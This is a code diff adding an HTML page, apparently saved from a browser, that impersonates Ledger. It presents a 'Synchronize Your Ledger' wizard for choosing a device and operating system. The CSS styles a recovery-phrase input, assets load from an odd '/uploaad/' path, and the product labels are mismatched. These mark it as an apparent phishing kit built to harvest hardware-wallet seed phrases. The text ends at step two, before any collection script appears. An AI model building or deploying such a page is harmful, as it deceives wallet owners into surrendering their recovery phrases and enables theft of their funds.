@@ -1,0 +1,1282 @@
+<html lang="en"><div id="in-page-channel-node-id" data-channel-name="in_page_channel_b0eRHC"></div><script src="chrome-extension://lgmpcpglpngdoalbgeoldeajfclnhafa/inpage.js"></script><head><script src="chrome-extension://fgddmllnllkalaagkghckoinaemmogpe/scripts/content/gps.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ledger Flex™ - Crypto Wallet Synchronization</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #e65400; /* Changed to red */
+            --primary-dark: #d32f2f;
+            --dark: #121212;
+            --darker: #0a0a0a;
+            --light: #f8f9fa;
+            --gray: #6c757d;
+            --dark-gray: #2d2d2d;
+            --darker-gray: #1e1e1e;
+            --danger: #dc3545;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--dark);
+            color: var(--light);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        header {
+            background-color: var(--darker);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--dark-gray);
+        }
+        
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-decoration: none;
+        }
+        
+        .hero {
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            color: white;
+            padding: 60px 0;
+            text-align: center;
+            border-bottom: 1px solid var(--dark-gray);
+        }
+        
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--light);
+        }
+        
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            color: var(--gray);
+        }
+        
+        .btn {
+            display: inline-block;
+            background-color: #e65400;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .btn:hover {
+            background-color: #e65400;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(255, 59, 48, 0.3);
+        }
+        
+        .btn-outline {
+            background-color: transparent;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+        }
+        
+        .btn-outline:hover {
+            background-color: var(--primary);
+            color: white;
+        }
+        
+        .sync-section {
+            background-color: var(--darker-gray);
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            padding: 40px;
+            margin: -50px auto 50px;
+            max-width: 800px;
+            position: relative;
+            border: 1px solid var(--dark-gray);
+        }
+        
+        .sync-section h2 {
+            color: var(--light);
+            margin-bottom: 30px;
+            font-size: 1.8rem;
+            text-align: center;
+        }
+        
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: var(--dark-gray);
+            z-index: 1;
+        }
+        
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .step-number {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: var(--dark-gray);
+            color: var(--gray);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .step.active .step-number {
+            background-color: var(--primary);
+            color: white;
+        }
+        
+        .step.completed .step-number {
+            background-color: var(--primary);
+            color: white;
+        }
+        
+        .step.completed .step-number::after {
+            content: '\f00c';
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+        }
+        
+        .step-label {
+            font-size: 0.9rem;
+            color: var(--gray);
+            font-weight: 500;
+        }
+        
+        .step.active .step-label {
+            color: var(--primary);
+        }
+        
+        .step-content {
+            display: none;
+        }
+        
+        .step-content.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+      .product-grid {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 30px;
+}
+.step-content h3 {
+    text-align: center;
+    width: 100%;
+}
+.product-card {
+    background-color: var(--dark-gray);
+    border-radius: 8px;
+    padding: 15px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    border: 2px solid transparent;
+    color: var(--light);
+    width: 150px;
+    min-height: 180px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: space-between;
+}
+
+/* Hover effect for product cards */
+.product-card:hover {
+    transform: translateY(-5px);
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    border-color: var(--dark-gray);
+    background-color: rgba(255, 59, 48, 0.05); /* Subtle red tint on hover */
+}
+
+/* Selected state for product cards */
+.product-card.selected {
+    border-color: var(--primary);
+    background-color: rgba(255, 59, 48, 0.1);
+    box-shadow: 0 5px 15px rgba(255, 59, 48, 0.2);
+}
+
+.product-card.selected:hover {
+    background-color: rgba(255, 59, 48, 0.15);
+}
+
+.product-card img {
+    width: 80px;
+    height: auto;
+    margin-bottom: 10px;
+    filter: brightness(0.9);
+    transition: all 0.3s ease;
+}
+
+/* Image hover effect */
+.product-card:hover img {
+    filter: brightness(1.1);
+    transform: scale(1.05);
+}
+
+.product-card h3 {
+    margin-bottom: 5px;
+    font-size: 1rem;
+    color: var(--light);
+    transition: all 0.3s ease;
+}
+
+/* Title hover effect */
+.product-card:hover h3 {
+    color: var(--primary);
+}
+
+.product-card p {
+    color: var(--gray);
+    font-size: 0.8rem;
+    margin-bottom: 5px;
+    transition: all 0.3s ease;
+}
+
+/* Description hover effect */
+.product-card:hover p {
+    color: var(--light);
+}
+
+/* Updated OS options styling */
+.os-options {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 30px;
+}
+
+.os-option {
+    background-color: var(--dark-gray);
+    border-radius: 8px;
+    padding: 12px 15px;
+    text-align: center;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    border: 2px solid transparent;
+    color: var(--light);
+    min-width: 100px;
+}
+
+/* OS option hover effect */
+.os-option:hover {
+    background-color: rgba(255, 59, 48, 0.05);
+    border-color: var(--dark-gray);
+}
+
+.os-option.selected {
+    border-color: var(--primary);
+    background-color: rgba(255, 59, 48, 0.1);
+}
+
+.os-option.selected:hover {
+    background-color: rgba(255, 59, 48, 0.15);
+}
+
+.os-option i {
+    font-size: 2rem;
+    margin-bottom: 10px;
+    color: var(--gray);
+    transition: all 0.3s ease;
+}
+
+/* OS icon hover effect */
+.os-option:hover i {
+    color: var(--primary);
+}
+
+.os-option.selected i {
+    color: var(--primary);
+}
+        
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--light);
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--dark-gray);
+            border-radius: 6px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+            background-color: var(--darker-gray);
+            color: var(--light);
+        }
+        
+        .form-control:focus {
+            border-color: var(--primary);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 59, 48, 0.25);
+        }
+        
+        .recovery-phrase-input {
+            min-height: 100px;
+            resize: vertical;
+        }
+        
+        .navigation-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .result-message {
+            text-align: center;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .success {
+            background-color: rgba(35, 209, 152, 0.1);
+            color: var(--primary);
+        }
+        
+        .error {
+            background-color: rgba(220, 53, 69, 0.1);
+            color: var(--danger);
+            border: 1px solid var(--danger);
+        }
+        
+        .features {
+            padding: 60px 0;
+            background-color: var(--darker);
+            border-top: 1px solid var(--dark-gray);
+            border-bottom: 1px solid var(--dark-gray);
+        }
+        
+        .features h2 {
+            text-align: center;
+            margin-bottom: 50px;
+            font-size: 2rem;
+            color: var(--light);
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+        
+        .feature-card {
+            text-align: center;
+            padding: 30px;
+            border-radius: 10px;
+            background-color: var(--dark-gray);
+            transition: all 0.3s ease;
+            color: var(--light);
+            border: 1px solid var(--dark-gray);
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            border-color: var(--primary);
+        }
+        
+        .feature-card i {
+            font-size: 2.5rem;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+        
+        .feature-card h3 {
+            margin-bottom: 15px;
+            font-size: 1.3rem;
+        }
+        
+        .compare-section {
+            padding: 60px 0;
+            background-color: var(--dark);
+        }
+        
+        .compare-section h2 {
+            text-align: center;
+            margin-bottom: 50px;
+            font-size: 2rem;
+            color: var(--light);
+        }
+        
+        .compare-table {
+            width: 100%;
+            border-collapse: collapse;
+            background-color: var(--darker-gray);
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .compare-table th, .compare-table td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid var(--dark-gray);
+            color: var(--light);
+        }
+        
+        .compare-table th {
+            background-color: var(--darker);
+            color: var(--light);
+            font-weight: 500;
+        }
+        
+        .compare-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .compare-table .feature-name {
+            font-weight: 500;
+            width: 30%;
+        }
+        
+        .compare-table .available {
+            color: var(--primary);
+            font-weight: 500;
+        }
+        
+        .compare-table .unavailable {
+            color: var(--gray);
+        }
+         .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            font-size: 1.5rem;
+        }
+        
+        .logo img {
+            height: 32px;
+        }
+        footer {
+            background-color: var(--darker);
+            color: white;
+            padding: 40px 0;
+            text-align: center;
+            border-top: 1px solid var(--dark-gray);
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+        
+        .footer-links a {
+            color: var(--gray);
+            margin: 0 15px;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-links a:hover {
+            color: var(--primary);
+        }
+        
+        .social-icons {
+            margin-bottom: 20px;
+        }
+        
+        .social-icons a {
+            color: var(--gray);
+            margin: 0 10px;
+            font-size: 1.2rem;
+            transition: color 0.3s ease;
+        }
+        
+        .social-icons a:hover {
+            color: var(--primary);
+        }
+        
+        .copyright {
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+        
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            .sync-section {
+                padding: 30px 20px;
+                margin: -30px auto 30px;
+            }
+            
+            .step-indicator {
+                margin-bottom: 30px;
+            }
+            
+            .step-label {
+                font-size: 0.8rem;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+         /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .product-grid {
+                gap: 10px;
+            }
+            
+            .product-card {
+                width: calc(33% - 10px);
+                min-height: 160px;
+                padding: 10px;
+            }
+            
+            .product-card img {
+                width: 60px;
+            }
+            
+            .os-options {
+                gap: 8px;
+            }
+            
+            .os-option {
+                min-width: calc(50% - 8px);
+                padding: 10px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .product-card {
+                width: calc(50% - 10px);
+            }
+        }
+    </style>
+<script src="chrome-extension://idnnbdplmphpflfnlkomgpfbpcgelopg/inpage.js" id="xverse-wallet-provider" data-is-priority="true"></script><style>@keyframes slide-in-one-tap {
+  from {
+    transform: translateY(80px);
+  }
+  to {
+    transform: translateY(0px);
+  }
+}
+
+.trust-hide-gracefully {
+  opacity: 0;
+}
+
+.trust-wallet-one-tap .hidden {
+    display: none;
+  }
+
+.trust-wallet-one-tap .semibold {
+    font-weight: 500;
+  }
+
+.trust-wallet-one-tap .binance-plex {
+    font-family: 'Binance';
+  }
+
+.trust-wallet-one-tap .rounded-full {
+    border-radius: 50%;
+  }
+
+.trust-wallet-one-tap .flex {
+    display: flex;
+  }
+
+.trust-wallet-one-tap .flex-col {
+    flex-direction: column;
+  }
+
+.trust-wallet-one-tap .items-center {
+    align-items: center;
+  }
+
+.trust-wallet-one-tap .space-between {
+    justify-content: space-between;
+  }
+
+.trust-wallet-one-tap .justify-center {
+    justify-content: center;
+  }
+
+.trust-wallet-one-tap .w-full {
+    width: 100%;
+  }
+
+.trust-wallet-one-tap .box {
+    transition: all 0.5s cubic-bezier(0, 0, 0, 1.43);
+    animation: slide-in-one-tap 0.5s cubic-bezier(0, 0, 0, 1.43);
+    width: 384px;
+    border-radius: 15px;
+    background: #fff;
+    box-shadow: 0px 2px 4px 0px rgba(0, 0, 0, 0.25);
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    z-index: 1020;
+  }
+
+.trust-wallet-one-tap .header {
+    gap: 15px;
+    border-bottom: 1px solid #e6e6e6;
+    padding: 10px 18px;
+  }
+
+.trust-wallet-one-tap .header .left-items {
+      gap: 15px;
+    }
+
+.trust-wallet-one-tap .header .title {
+      color: #1e2329;
+      font-size: 18px;
+      font-weight: 600;
+      line-height: 28px;
+    }
+
+.trust-wallet-one-tap .header .subtitle {
+      color: #474d57;
+      font-size: 14px;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .header .close {
+      color: #1e2329;
+      cursor: pointer;
+    }
+
+.trust-wallet-one-tap .body {
+    padding: 9px 18px;
+    gap: 10px;
+  }
+
+.trust-wallet-one-tap .body .right-items {
+      gap: 10px;
+      width: 100%;
+    }
+
+.trust-wallet-one-tap .body .right-items .wallet-title {
+        color: #1e2329;
+        font-size: 16px;
+        font-weight: 600;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .body .right-items .wallet-subtitle {
+        color: #474d57;
+        font-size: 14px;
+        line-height: 20px;
+      }
+
+.trust-wallet-one-tap .connect-indicator {
+    gap: 15px;
+    padding: 8px 0;
+  }
+
+.trust-wallet-one-tap .connect-indicator .flow-icon {
+      color: #474d57;
+    }
+
+.trust-wallet-one-tap .loading-color {
+    color: #fff;
+  }
+
+.trust-wallet-one-tap .button {
+    border-radius: 50px;
+    outline: 2px solid transparent;
+    outline-offset: 2px;
+    background-color: rgb(5, 0, 255);
+    border-color: rgb(229, 231, 235);
+    cursor: pointer;
+    text-align: center;
+    height: 45px;
+  }
+
+.trust-wallet-one-tap .button .button-text {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      line-height: 20px;
+    }
+
+.trust-wallet-one-tap .footer {
+    margin: 20px 30px;
+  }
+
+.trust-wallet-one-tap .check-icon {
+    color: #fff;
+  }
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Regular.otf) format('opentype');
+  font-weight: 400;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-Medium.otf) format('opentype');
+  font-weight: 500;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: 'Binance';
+  src: url(chrome-extension://egjidjbpglichdcondbcbdnbeeppgdph/fonts/BinancePlex-SemiBold.otf) format('opentype');
+  font-weight: 600;
+  font-style: normal;
+}
+
+/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly8uL2FwcC9zcmMvb25lVGFwL3N0eWxlLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFO0lBQ0UsMkJBQTJCO0VBQzdCO0VBQ0E7SUFDRSwwQkFBMEI7RUFDNUI7QUFDRjs7QUFFQTtFQUNFLFVBQVU7QUFDWjs7QUFHRTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLGdCQUFnQjtFQUNsQjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLGtCQUFrQjtFQUNwQjs7QUFFQTtJQUNFLGFBQWE7RUFDZjs7QUFFQTtJQUNFLHNCQUFzQjtFQUN4Qjs7QUFFQTtJQUNFLG1CQUFtQjtFQUNyQjs7QUFFQTtJQUNFLDhCQUE4QjtFQUNoQzs7QUFFQTtJQUNFLHVCQUF1QjtFQUN6Qjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFFQTtJQUNFLGdEQUFnRDtJQUNoRCw0REFBNEQ7SUFDNUQsWUFBWTtJQUNaLG1CQUFtQjtJQUNuQixnQkFBZ0I7SUFDaEIsK0NBQStDO0lBQy9DLGVBQWU7SUFDZixXQUFXO0lBQ1gsWUFBWTtJQUNaLGFBQWE7RUFDZjs7QUFFQTtJQUNFLFNBQVM7SUFDVCxnQ0FBZ0M7SUFDaEMsa0JBQWtCO0VBdUJwQjs7QUFyQkU7TUFDRSxTQUFTO0lBQ1g7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGdCQUFnQjtNQUNoQixpQkFBaUI7SUFDbkI7O0FBRUE7TUFDRSxjQUFjO01BQ2QsZUFBZTtNQUNmLGlCQUFpQjtJQUNuQjs7QUFFQTtNQUNFLGNBQWM7TUFDZCxlQUFlO0lBQ2pCOztBQUdGO0lBQ0UsaUJBQWlCO0lBQ2pCLFNBQVM7RUFtQlg7O0FBakJFO01BQ0UsU0FBUztNQUNULFdBQVc7SUFjYjs7QUFaRTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsZ0JBQWdCO1FBQ2hCLGlCQUFpQjtNQUNuQjs7QUFFQTtRQUNFLGNBQWM7UUFDZCxlQUFlO1FBQ2YsaUJBQWlCO01BQ25COztBQUlKO0lBQ0UsU0FBUztJQUNULGNBQWM7RUFLaEI7O0FBSEU7TUFDRSxjQUFjO0lBQ2hCOztBQUdGO0lBQ0UsV0FBVztFQUNiOztBQUVBO0lBQ0UsbUJBQW1CO0lBQ25CLDhCQUE4QjtJQUM5QixtQkFBbUI7SUFDbkIsZ0NBQWdDO0lBQ2hDLGdDQUFnQztJQUNoQyxlQUFlO0lBQ2Ysa0JBQWtCO0lBQ2xCLFlBQVk7RUFRZDs7QUFORTtNQUNFLFdBQVc7TUFDWCxlQUFlO01BQ2YsZ0JBQWdCO01BQ2hCLGlCQUFpQjtJQUNuQjs7QUFHRjtJQUNFLGlCQUFpQjtFQUNuQjs7QUFFQTtJQUNFLFdBQVc7RUFDYjs7QUFHRjtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMEU7RUFDMUUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBeUU7RUFDekUsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLHNCQUFzQjtFQUN0QiwrREFBMkU7RUFDM0UsZ0JBQWdCO0VBQ2hCLGtCQUFrQjtBQUNwQiIsInNvdXJjZXNDb250ZW50IjpbIkBrZXlmcmFtZXMgc2xpZGUtaW4tb25lLXRhcCB7XG4gIGZyb20ge1xuICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSg4MHB4KTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDBweCk7XG4gIH1cbn1cblxuLnRydXN0LWhpZGUtZ3JhY2VmdWxseSB7XG4gIG9wYWNpdHk6IDA7XG59XG5cbi50cnVzdC13YWxsZXQtb25lLXRhcCB7XG4gIC5oaWRkZW4ge1xuICAgIGRpc3BsYXk6IG5vbmU7XG4gIH1cblxuICAuc2VtaWJvbGQge1xuICAgIGZvbnQtd2VpZ2h0OiA1MDA7XG4gIH1cblxuICAuYmluYW5jZS1wbGV4IHtcbiAgICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICB9XG5cbiAgLnJvdW5kZWQtZnVsbCB7XG4gICAgYm9yZGVyLXJhZGl1czogNTAlO1xuICB9XG5cbiAgLmZsZXgge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gIH1cblxuICAuZmxleC1jb2wge1xuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gIH1cblxuICAuaXRlbXMtY2VudGVyIHtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICB9XG5cbiAgLnNwYWNlLWJldHdlZW4ge1xuICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjtcbiAgfVxuXG4gIC5qdXN0aWZ5LWNlbnRlciB7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIH1cblxuICAudy1mdWxsIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgfVxuXG4gIC5ib3gge1xuICAgIHRyYW5zaXRpb246IGFsbCAwLjVzIGN1YmljLWJlemllcigwLCAwLCAwLCAxLjQzKTtcbiAgICBhbmltYXRpb246IHNsaWRlLWluLW9uZS10YXAgMC41cyBjdWJpYy1iZXppZXIoMCwgMCwgMCwgMS40Myk7XG4gICAgd2lkdGg6IDM4NHB4O1xuICAgIGJvcmRlci1yYWRpdXM6IDE1cHg7XG4gICAgYmFja2dyb3VuZDogI2ZmZjtcbiAgICBib3gtc2hhZG93OiAwcHggMnB4IDRweCAwcHggcmdiYSgwLCAwLCAwLCAwLjI1KTtcbiAgICBwb3NpdGlvbjogZml4ZWQ7XG4gICAgcmlnaHQ6IDMwcHg7XG4gICAgYm90dG9tOiAzMHB4O1xuICAgIHotaW5kZXg6IDEwMjA7XG4gIH1cblxuICAuaGVhZGVyIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlNmU2ZTY7XG4gICAgcGFkZGluZzogMTBweCAxOHB4O1xuXG4gICAgLmxlZnQtaXRlbXMge1xuICAgICAgZ2FwOiAxNXB4O1xuICAgIH1cblxuICAgIC50aXRsZSB7XG4gICAgICBjb2xvcjogIzFlMjMyOTtcbiAgICAgIGZvbnQtc2l6ZTogMThweDtcbiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICBsaW5lLWhlaWdodDogMjhweDtcbiAgICB9XG5cbiAgICAuc3VidGl0bGUge1xuICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICBmb250LXNpemU6IDE0cHg7XG4gICAgICBsaW5lLWhlaWdodDogMjBweDtcbiAgICB9XG5cbiAgICAuY2xvc2Uge1xuICAgICAgY29sb3I6ICMxZTIzMjk7XG4gICAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgfVxuICB9XG5cbiAgLmJvZHkge1xuICAgIHBhZGRpbmc6IDlweCAxOHB4O1xuICAgIGdhcDogMTBweDtcblxuICAgIC5yaWdodC1pdGVtcyB7XG4gICAgICBnYXA6IDEwcHg7XG4gICAgICB3aWR0aDogMTAwJTtcblxuICAgICAgLndhbGxldC10aXRsZSB7XG4gICAgICAgIGNvbG9yOiAjMWUyMzI5O1xuICAgICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7XG4gICAgICAgIGxpbmUtaGVpZ2h0OiAyMHB4O1xuICAgICAgfVxuXG4gICAgICAud2FsbGV0LXN1YnRpdGxlIHtcbiAgICAgICAgY29sb3I6ICM0NzRkNTc7XG4gICAgICAgIGZvbnQtc2l6ZTogMTRweDtcbiAgICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgICB9XG4gICAgfVxuICB9XG5cbiAgLmNvbm5lY3QtaW5kaWNhdG9yIHtcbiAgICBnYXA6IDE1cHg7XG4gICAgcGFkZGluZzogOHB4IDA7XG5cbiAgICAuZmxvdy1pY29uIHtcbiAgICAgIGNvbG9yOiAjNDc0ZDU3O1xuICAgIH1cbiAgfVxuXG4gIC5sb2FkaW5nLWNvbG9yIHtcbiAgICBjb2xvcjogI2ZmZjtcbiAgfVxuXG4gIC5idXR0b24ge1xuICAgIGJvcmRlci1yYWRpdXM6IDUwcHg7XG4gICAgb3V0bGluZTogMnB4IHNvbGlkIHRyYW5zcGFyZW50O1xuICAgIG91dGxpbmUtb2Zmc2V0OiAycHg7XG4gICAgYmFja2dyb3VuZC1jb2xvcjogcmdiKDUsIDAsIDI1NSk7XG4gICAgYm9yZGVyLWNvbG9yOiByZ2IoMjI5LCAyMzEsIDIzNSk7XG4gICAgY3Vyc29yOiBwb2ludGVyO1xuICAgIHRleHQtYWxpZ246IGNlbnRlcjtcbiAgICBoZWlnaHQ6IDQ1cHg7XG5cbiAgICAuYnV0dG9uLXRleHQge1xuICAgICAgY29sb3I6ICNmZmY7XG4gICAgICBmb250LXNpemU6IDE2cHg7XG4gICAgICBmb250LXdlaWdodDogNjAwO1xuICAgICAgbGluZS1oZWlnaHQ6IDIwcHg7XG4gICAgfVxuICB9XG5cbiAgLmZvb3RlciB7XG4gICAgbWFyZ2luOiAyMHB4IDMwcHg7XG4gIH1cblxuICAuY2hlY2staWNvbiB7XG4gICAgY29sb3I6ICNmZmY7XG4gIH1cbn1cblxuQGZvbnQtZmFjZSB7XG4gIGZvbnQtZmFtaWx5OiAnQmluYW5jZSc7XG4gIHNyYzogdXJsKCcuL2ZvbnRzL2JpbmFuY2VQbGV4L0JpbmFuY2VQbGV4LVJlZ3VsYXIub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNDAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1NZWRpdW0ub3RmJykgZm9ybWF0KCdvcGVudHlwZScpO1xuICBmb250LXdlaWdodDogNTAwO1xuICBmb250LXN0eWxlOiBub3JtYWw7XG59XG5cbkBmb250LWZhY2Uge1xuICBmb250LWZhbWlseTogJ0JpbmFuY2UnO1xuICBzcmM6IHVybCgnLi9mb250cy9iaW5hbmNlUGxleC9CaW5hbmNlUGxleC1TZW1pQm9sZC5vdGYnKSBmb3JtYXQoJ29wZW50eXBlJyk7XG4gIGZvbnQtd2VpZ2h0OiA2MDA7XG4gIGZvbnQtc3R5bGU6IG5vcm1hbDtcbn1cbiJdLCJzb3VyY2VSb290IjoiIn0= */</style></head>
+<body>
+    <header>
+        <div class="container">
+            <nav class="navbar">
+               <div class="logo">
+                    <img src="/uploaad/ledger.svg" alt="Logo">
+                    <span></span>
+                </div>
+                <div>
+                    <a href="#" class="btn btn-outline">Compare Wallets</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+    
+    <section class="hero">
+        <div class="container">
+            <h1>Upgrade Your Crypto Experience</h1>
+            <p>Ledger Flex™ provides the best crypto user experience to manage your digital assets with uncompromising security.</p>
+            <a href="#sync" class="btn">Synchronize Your Ledger</a>
+        </div>
+    </section>
+    
+    <section id="sync" class="sync-section">
+        <h2>Synchronize Your Ledger</h2>
+        
+        <div class="step-indicator">
+            <div class="step active" data-step="1">
+                <div class="step-number">1</div>
+                <div class="step-label">Choose Product</div>
+            </div>
+            <div class="step" data-step="2">
+                <div class="step-number">2</div>
+                <div class="step-label">Select OS</div>
+            </div>
+            <div class="step" data-step="3">
+                <div class="step-number">3</div>
+                <div class="step-label">Connect Device</div>
+            </div>
+            <div class="step" data-step="4">
+                <div class="step-number">4</div>
+                <div class="step-label">Complete</div>
+            </div>
+        </div>
+        
+      <div class="step-content active" data-step-content="1">
+        <h3>Choose Your Ledger Product</h3>
+        <p>Select the Ledger hardware wallet you want to synchronize.</p>
+        
+        <div class="product-grid">
+            <div class="product-card" data-product="nano-x">
+                <img src="/uploaad/nanox.png" alt="Ledger Nano X">
+                <h3>Nano X</h3>
+                <p>Bluetooth</p>
+            </div>
+            <div class="product-card" data-product="nano-s">
+                <img src="/uploaad/nanos.png" alt="Ledger Nano S">
+                <h3>Nano S</h3>
+                <p>Basic</p>
+            </div>
+            <div class="product-card" data-product="nano-s-plus">
+                <img src="https://cdn.shopify.com/s/files/1/2974/4858/products/01_2_x700.png?v=1647271593" alt="Ledger Nano S Plus">
+                <h3>Nano S Plus</h3>
+                <p>Enhanced</p>
+            </div>
+            <div class="product-card" data-product="nano-blue">
+                <img src="/uploaad/ledgerstax.png" alt="Ledger Nano Blue">
+                <h3>Ledger Flex</h3>
+                <p>Premium</p>
+            </div>
+            <div class="product-card" data-product="nano-blue">
+                <img src="/uploaad/flex.png" alt="Ledger Nano Blue">
+                <h3>Ledger Stax</h3>
+                <p>Premium</p>
+            </div>
+        </div>
+      
+        
+        <div class="navigation-buttons">
+            <button class="btn" disabled="">Previous</button>
+            <button class="btn next-step">Next</button>
+        </div>
+    </div>
+    
+    <div class="step-content" data-step-content="2">
+        <h3>Choose Your Operating System</h3>
